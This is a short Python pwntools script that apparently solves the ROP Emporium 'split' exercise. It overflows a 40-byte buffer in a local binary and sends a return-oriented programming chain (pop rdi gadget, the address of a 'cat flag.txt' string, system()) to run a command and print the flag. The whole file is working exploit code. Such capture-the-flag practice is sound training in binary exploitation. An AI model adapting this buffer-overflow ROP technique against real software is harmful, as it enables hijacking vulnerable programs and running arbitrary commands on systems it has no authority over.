#/usr/bin/python3
from pwn import process, p64, log

shell = process("./split")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x4007c3) # pop rdi; ret;
payload += p64(0x601060) # "cat flag.txt"
payload += p64(0x40053e) # ret;
payload += p64(0x400560) # system()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
